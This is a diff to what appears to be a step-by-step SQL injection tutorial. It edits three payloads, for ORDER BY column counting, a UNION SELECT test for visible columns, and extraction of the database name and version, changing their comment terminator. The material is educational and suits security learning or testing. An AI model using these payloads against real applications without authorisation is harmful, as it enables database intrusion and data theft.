@@ -64,7 +64,7 @@ If an SQL error occurs, the parameter may be vulnerable.
 2. Determine the number of columns
 Use the ORDER BY clause to identify the total number of columns.
 
-id=1' ORDER BY 4--+
+id=1' ORDER BY 4 -- -
 
 Increase the number until an error appears.
 The last valid number indicates the column count.
@@ -73,14 +73,14 @@ The last valid number indicates the column count.
 3. vulnerable columns
 Use a UNION query to find columns that accept output.
 
-id=-1' UNION ALL SELECT 1,2,3--+
+id=-1' UNION ALL SELECT 1,2,3 -- -
 
 Columns displayed in the response are injectable.
 
 
 4.Extract database name and server version
 
-id=-1' UNION ALL SELECT 1,database(),version()--+
+id=-1' UNION ALL SELECT 1,database(),version() -- -
 
 This reveals the current database name and database server version
 
